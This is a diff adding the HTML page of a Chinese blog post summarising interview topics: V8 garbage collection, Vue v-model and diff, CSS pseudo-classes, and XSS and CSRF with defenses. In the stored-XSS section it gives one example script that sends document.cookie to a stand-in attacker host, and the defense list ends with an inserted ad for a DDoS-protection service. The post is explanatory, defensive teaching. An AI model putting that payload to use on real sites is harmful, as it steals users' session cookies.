@@ -1,0 +1,324 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>一些面试的总结 - 缘来</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近又参加了许多的面试，这里简单总结一下面试中遇到的自己还不是太清楚的问题。主要是一些自己之前没了解过的知识点。
+V8垃圾回收
+v8是Go,"> 
+    <meta name="author" content="coolsong"> 
+    <link rel="alternative" href="atom.xml" title="缘来" type="application/atom+xml"> 
+    <link rel="icon" href="/img/x1.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">缘来</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://songxuy.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">一些面试的总结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">一些面试的总结</h1>
+        <div class="stuff">
+            <span>六月 28, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/JavaScript/">JavaScript</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近又参加了许多的面试，这里简单总结一下面试中遇到的自己还不是太清楚的问题。主要是一些自己之前没了解过的知识点。<br><a id="more"></a></p>
+<h3 id="V8垃圾回收"><a href="#V8垃圾回收" class="headerlink" title="V8垃圾回收"></a>V8垃圾回收</h3><blockquote>
+<p>v8是Google推出的JS引擎，他不仅提升了Chrome的性能，也为node提供了很好的支持。其垃圾回收机制主要采用的是内存分代。</p>
+</blockquote>
+<h4 id="V8的内存分代"><a href="#V8的内存分代" class="headerlink" title="V8的内存分代"></a>V8的内存分代</h4><blockquote>
+<p>在v8中将内存分为了新生代和老生代，他们的主要特点如下：</p>
+</blockquote>
+<ul>
+<li>老生代：对象存活时间较长。经历过一次或多次垃圾回收的对象。</li>
+<li>新生代：对象的存活时间较短。新生对象或只经过一次垃圾回收的对象。</li>
+</ul>
+<blockquote>
+<p>V8堆的空间等于新生代空间加上老生代空间。我们可以通过 –max-old-space-size命令设置老生代空间的最大值，–max-new-space-size 命令设置新生代空间的最大值。老生代与新生代的空间大小在程序初始化时设置，一旦生效则不能动态改变。</p>
+</blockquote>
+<h4 id="回收算法"><a href="#回收算法" class="headerlink" title="回收算法"></a>回收算法</h4><ul>
+<li>新生代算法： 主要采用Scavenge算法</li>
+</ul>
+<blockquote>
+<p>先在新生代区，将堆内存对半分，一半处于使用(即From区)，另一半处于闲置(即To区)，平时在From区进行操作。到了要回收的时候，检测From区的对象，存活的对象复制到To   区，然后From区被释放了，之后对To区和From区调换名字，继续重复之前操作</p>
+</blockquote>
+<ul>
+<li>对象晋升： 新生代 -&gt; 老生代</li>
+</ul>
+<blockquote>
+<p>对象是否经历过Scavenge回收。对象从 From 空间复制 To 空间时，会检查对象的内存地址来判断对象是否已经经过一次Scavenge回收。若经历过，则将对象从 From 空间复制到老生代中；若没有经历，则复制到 To 空间。</p>
+</blockquote>
+<blockquote>
+<p>To 空间的内存使用占比是否超过限制。当对象从From 空间复制到 To 空间时，若 To 空间使用超过 25%，则对象直接晋升到老生代中。设置为25%的比例的原因是，当完成 Scavenge 回收后，To 空间将翻转成From 空间，继续进行对象内存的分配。若占比过大，将影响后续内存分配。</p>
+</blockquote>
+<ul>
+<li>老生代算法： 标记清除 搭配 标记整理算法</li>
+</ul>
+<blockquote>
+<p>标记清除算法：先将存活的对象进行标记，清除时只清除没有标记的（老生代中都是生命周期长的对象，刚好死亡的对象少），不过此时会出现内存不连续的情况。但是，如果此时需要放一个大对象，则放不下，从而导致再次引起回收。然而这次回收是不必要的。</p>
+</blockquote>
+<blockquote>
+<p>标记整理算法：先将死亡的对象进行标记，然后将存活得对象往一段移动，移动完成后，清理掉边界外的内存。</p>
+</blockquote>
+<h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><blockquote>
+<p>我们应该都知道v-model是用来在一些表单控件（input、select、textarea）上创建双向数据绑定。其本质上也是语法糖，不同的控件对应着不同的属性和事件。但是在自定义组件上又起着怎样的作用呢？</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base-checkbox v-model=&quot;value&quot;&gt;&lt;/base-checkbox&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value attribute 用于不同的目的。这样的话主要是使用model选项来控制</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">'base-checkbox'</span>, &#123;</span><br><span class="line">  model: &#123;</span><br><span class="line">    prop: <span class="string">'checked'</span>,</span><br><span class="line">    event: <span class="string">'change'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    checked: <span class="built_in">Boolean</span></span><br><span class="line">  &#125;,</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      type="checkbox"</span></span><br><span class="line"><span class="string">      v-bind:checked="checked"</span></span><br><span class="line"><span class="string">      v-on:change="$emit('change', $event.target.checked)"</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;base-checkbox v-model=<span class="string">"message"</span>&gt;&lt;<span class="regexp">/base-checkbox&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里的 message 的值将会传入这个名为 checked 的 prop。同时当 <base-checkbox> 触发一个 change 事件并附带一个新的值的时候，这个 message 的 property 将会被更新</base-checkbox></p>
+</blockquote>
+<h3 id="Vue-DIFF-算法"><a href="#Vue-DIFF-算法" class="headerlink" title="Vue DIFF 算法"></a>Vue DIFF 算法</h3><blockquote>
+<p>简单的来说，vue的diff算法会有以下的过程：</p>
+<ul>
+<li>同级比较，再比较子节点</li>
+<li>先判断一方有子节点一方没有子节点的情况（如果新的children没有子节点，将旧的子节点移除）</li>
+<li>比较都有子节点的情况（核心diff）</li>
+<li>递归比较子节点</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>Vue2的核心diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，在进行相关操作。</p>
+</blockquote>
+<blockquote>
+<p>Vue3借鉴了<a href="https://github.com/localvoid/ivi" target="_blank" rel="noopener">ivi</a>算法和<a href="https://github.com/infernojs/inferno" target="_blank" rel="noopener">inferno</a>算法<br>在创建VNode时就确定其类型，以及在patch的过程中采用位运算来判断其类型。<br>更加详细的介绍可以参考<a href="https://juejin.im/post/5d36cc575188257aea108a74" target="_blank" rel="noopener">深入剖析：Vue核心之虚拟DOM</a></p>
+</blockquote>
+<h3 id="伪类和伪元素"><a href="#伪类和伪元素" class="headerlink" title="伪类和伪元素"></a>伪类和伪元素</h3><blockquote>
+<p>大家应该都听过这两个名词，但是这两个却很容易混淆，我们要牢记这些概念需要从它们的产生开始了解。</p>
+</blockquote>
+<blockquote>
+<p>css引入伪类和伪元素概念是为了格式化文档树以外的信息。也就是说，伪类和伪元素是用来修饰不在文档树中的部分，比如，一句话中的第一个字母，或者是列表中的第一个元素。下面分别对伪类和伪元素进行解释。</p>
+</blockquote>
+<blockquote>
+<p>伪类用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的css类相似，可以为已有的元素添加样式，但是它只有处于dom树无法描述的状态下才能为元素添加样式，所以将其称为伪类。</p>
+</blockquote>
+<blockquote>
+<p>伪元素用于创建一些不在文档树中的元素，并为其添加样式。比如说，我们可以通过:before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。</p>
+</blockquote>
+<ul>
+<li>具体标签<br><img src="/images/class1.png" alt="Image"><br><img src="/images/class2.png" alt="Image"></li>
+</ul>
+<h3 id="前端安全相关"><a href="#前端安全相关" class="headerlink" title="前端安全相关"></a>前端安全相关</h3><blockquote>
+<p>大家应该都知道一些这方面的知识，比如XSS、CSRF等，但是当别人问的更加详细时（如何实现相应的攻击等），就有可能回答不上来了。</p>
+</blockquote>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote>
+<p>XSS(Cross Site Script)跨站脚本攻击。指的是攻击者向网页注入恶意的客户端代码，通过恶意的脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。主要分为3种：</p>
+</blockquote>
+<h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><blockquote>
+<p>反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</p>
+</blockquote>
+<blockquote>
+<p>反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。</p>
+</blockquote>
+<blockquote>
+<p>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 “反射”到受害者的浏览器上，从而浏览器就执行了该脚本。</p>
+</blockquote>
+<ul>
+<li>攻击步骤</li>
+</ul>
+<ol>
+<li>攻击者在url后面的参数中加入恶意攻击代码。</li>
+<li>当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。</li>
+<li>用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。</li>
+<li>攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</li>
+</ol>
+<h5 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h5><blockquote>
+<p>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p>
+</blockquote>
+<blockquote>
+<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open(“<a href="http://www.gongji.com?param=&quot;+document.cookie">www.gongji.com?param=&quot;+document.cookie</a>)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。</p>
+</blockquote>
+<ul>
+<li>攻击步骤</li>
+</ul>
+<ol>
+<li>攻击者将恶意代码提交到目标网站数据库中。</li>
+<li>用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。</li>
+<li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
+<li>那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
+</ol>
+<h5 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h5><blockquote>
+<p>我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。</p>
+</blockquote>
+<ul>
+<li>攻击步骤</li>
+</ul>
+<ol>
+<li>使用document.write直接输出数据。</li>
+<li>使用innerHTML直接输出数据。</li>
+<li>使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。</li>
+</ol>
+<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ol>
+<li>对输入内容的特定字符进行编码，例如表示 html标记的 &lt; &gt; 等符号。 </li>
+<li>对重要的 cookie设置 httpOnly, 防止客户端通过document.cookie读取 cookie，此 HTTP头由服务端设置。 </li>
+<li>将不可信的值输出 URL参数之前，进行 URLEncode操作，而对于从 URL参数中获取值一定要进行格式检测（比如你需要的时URL，就判读是否满足URL格式）。 </li>
+<li>不要使用 Eval来解析并运行不确定的数据或代码，对于 JSON解析请使用 JSON.parse() 方法。 5. 后端接口也应该要做到关键字符过滤的问题。 以上，是小墨给大家分享的关于XSS攻击的全部内容，大家记得收藏方便以后查看哦。如今，各种类型网络攻击日益频繁，除了XSS攻击之外，比较常见的网络攻击类型还包括DDoS攻击、CC攻击等，它们非常难以防御，除了需要做好日常网络安全防护之外，还需要接入高防服务，可以接入墨者盾高防，通过墨者盾高防隐藏源IP，对攻击流量进行清洗，保障企业网络及业务的正常运行。</li>
+</ol>
+<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><blockquote>
+<p>CSRF攻击(Cross-site request forgery)跨站请求伪造。是一种劫持受信任用户向服务器发送非预期请求的攻击方式，通常情况下，它是攻击者借助受害者的 Cookie 骗取服务器的信任，但是它并不能拿到Cookie，也看不到Cookie的内容，它能做的就是给服务器发送请求，然后执行请求中所描述的命令，以此来改变服务器中的数据，也就是并不能窃取服务器中的数据。</p>
+</blockquote>
+<ul>
+<li>攻击步骤</li>
+</ul>
+<ol>
+<li>登录受信任网站A，并在本地生成Cookie。</li>
+<li>在不登出A的情况下，访问危险网站B。</li>
+</ol>
+<ul>
+<li>防御</li>
+</ul>
+<ol>
+<li>验证Token：浏览器请求服务器时，服务器返回一个token，每个请求都需要同时带上token和cookie才会被认为是合法请求</li>
+<li>验证Referer：通过验证请求头的Referer来验证来源站点，但请求头很容易伪造</li>
+<li>设置SameSite：设置cookie的SameSite，可以让cookie不随跨站请求发出，但浏览器兼容不一</li>
+</ol>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#V8垃圾回收"><span class="toc-number">1.</span> <span class="toc-text">V8垃圾回收</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#V8的内存分代"><span class="toc-number">1.1.</span> <span class="toc-text">V8的内存分代</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#回收算法"><span class="toc-number">1.2.</span> <span class="toc-text">回收算法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v-model"><span class="toc-number">2.</span> <span class="toc-text">v-model</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vue-DIFF-算法"><span class="toc-number">3.</span> <span class="toc-text">Vue DIFF 算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪类和伪元素"><span class="toc-number">4.</span> <span class="toc-text">伪类和伪元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前端安全相关"><span class="toc-number">5.</span> <span class="toc-text">前端安全相关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">5.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#反射型"><span class="toc-number">5.1.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#存储型"><span class="toc-number">5.1.2.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM型"><span class="toc-number">5.1.3.</span> <span class="toc-text">DOM型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#防御"><span class="toc-number">5.1.4.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF"><span class="toc-number">5.2.</span> <span class="toc-text">CSRF</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":145,"height":315,"vOffset":-60},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
